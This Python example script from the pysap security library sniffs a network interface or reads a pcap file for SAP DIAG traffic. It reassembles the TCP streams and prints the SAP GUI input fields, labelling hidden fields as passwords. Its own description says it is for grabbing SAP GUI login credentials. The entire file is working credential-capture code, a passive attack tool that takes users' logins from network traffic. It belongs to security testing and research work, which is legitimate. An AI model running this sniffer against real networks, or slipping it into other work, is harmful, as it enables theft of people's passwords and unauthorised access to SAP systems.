#!/usr/bin/env python
# ===========
# pysap - Python library for crafting SAP's network protocols packets
#
# Copyright (C) 2015 by Martin Gallo, Core Security
#
# The library was designed and developed by Martin Gallo from the Security
# Consulting Services team of Core Security.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# ==============

# Standard imports
import logging
import itertools
from struct import unpack
from optparse import OptionParser, OptionGroup
# External imports
from scapy.config import conf
from scapy.sendrecv import sniff
from scapy.layers.inet import IP, TCP
from scapy.packet import bind_layers, split_layers, Raw
# Custom imports
import pysap
from pysap.SAPNI import SAPNI
from pysap.SAPDiag import SAPDiag, SAPDiagDP
from pysap.SAPDiagItems import *


# Bind the SAPDiag layer
bind_layers(SAPNI, SAPDiag,)
bind_layers(SAPNI, SAPDiagDP,)
bind_layers(SAPDiagDP, SAPDiag,)
bind_layers(SAPDiag, SAPDiagItem,)
bind_layers(SAPDiagItem, SAPDiagItem,)
# Unbind the SAPNI layer so we can perform the reassemble
split_layers(TCP, SAPNI, dport=3200)


# Set the verbosity to 0
conf.verb = 0


class DiagParser(object):

    packets_metadata = {}

    def __init__(self, options):
        self.options = options
        self.port = options.port

    def parse_packet(self, pkt):
        if TCP in pkt and Raw in pkt:
            if self.port in [pkt[TCP].sport,
                             pkt[TCP].dport]:
                key = ["%s_%d" % (pkt[IP].src, pkt[TCP].sport),
                       "%s_%d" % (pkt[IP].dst, pkt[TCP].dport)]
                key.sort()
                key = "_".join(key)
                if key not in self.packets_metadata:
                    self.packets_metadata[key] = []
                self.packets_metadata[key].append((pkt[TCP].seq + pkt[TCP].ack,
                                                   str(pkt[Raw].load)))

    def reassemble(self):
        # Build a stream of packets for each connection
        streams = {}
        for key, value in list(self.packets_metadata.items()):
            value.sort()
            value = list(value for value, __ in itertools.groupby(value))
            streams[key] = ''
            for pkts in sorted(value):
                streams[key] += pkts[1]

        # Parse the NI packets in each stream
        packets = {}
        for key, stream in list(streams.items()):
            packets[key] = []
            while len(stream) > 0:
                length = unpack("!I", stream[:4])[0]
                packets[key].append(SAPNI(stream[:length + 4]))
                stream = stream[length + 4:]

        # Parse the input fields on each packet
        for key in list(packets.keys()):
            print("[*] Conversation between %s (%d NI packets)" % ("%s:%s and %s:%s" % tuple(key.split("_")),
                                                                   len(packets[key])))
            for packet in packets[key]:
                self.parse_fields(packet)

    def parse_fields(self, pkt):
        if SAPDiag in pkt and pkt[SAPDiag].message:
            atoms = pkt[SAPDiag].get_item(["APPL", "APPL4"], "DYNT", "DYNT_ATOM")
            # Print the Atom items information
            if len(atoms) > 0:
                print("[*] Input fields:")
                for atom in [atom for atom_item in atoms for atom in atom_item.item_value.items]:
                    if atom.etype in [121, 122, 123, 130, 131, 132]:
                        text = atom.field1_text or atom.field2_text
                        text = text.strip()
                        if atom.attr_DIAG_BSD_INVISIBLE and len(text) > 0:
                            # If the invisible flag was set, we're probably
                            # dealing with a password field
                            print("[*]\tPassword field:\t%s" % (text))
                        else:
                            print("[*]\tRegular field:\t%s" % (text))


# Command line options parser
def parse_options():

    description = \
    """This example script can be used to grab SAP GUI login credentials from
    a pcap file or by sniffing on a network interface.
    """

    epilog = "pysap %(version)s - %(url)s - %(repo)s" % {"version": pysap.__version__,
                                                         "url": pysap.__url__,
                                                         "repo": pysap.__repo__}

    usage = "Usage: %prog [options] [-i <interface> | -f <pcap file>]"

    parser = OptionParser(usage=usage, description=description, epilog=epilog)

    target = OptionGroup(parser, "Target")
    target.add_option("-i", "--interface", dest="interface", help="Choose an interface")
    target.add_option("-f", "--file", dest="pcap", help="Parse info from a pcap file")
    target.add_option("-p", "--port", dest="port", type="int", default=3200, help="Port to use as filter [%default]")
    parser.add_option_group(target)

    misc = OptionGroup(parser, "Misc options")
    misc.add_option("-v", "--verbose", dest="verbose", action="store_true",
                    default=False, help="Verbose output [%default]")
    parser.add_option_group(misc)

    (options, _) = parser.parse_args()

    return options


# Main function
def main():
    options = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    parser = DiagParser(options)

    if options.pcap:
        print("[*] Parsing pcap file (%s)" % options.pcap)
    else:
        print("[*] Listening on interface (%s)" % options.interface)

    try:
        sniff(iface=options.interface, offline=options.pcap, prn=parser.parse_packet, store=0)
    except KeyboardInterrupt:
        pass

    print("[*] Finished parsing/sniffing")
    parser.reassemble()


if __name__ == "__main__":
    main()
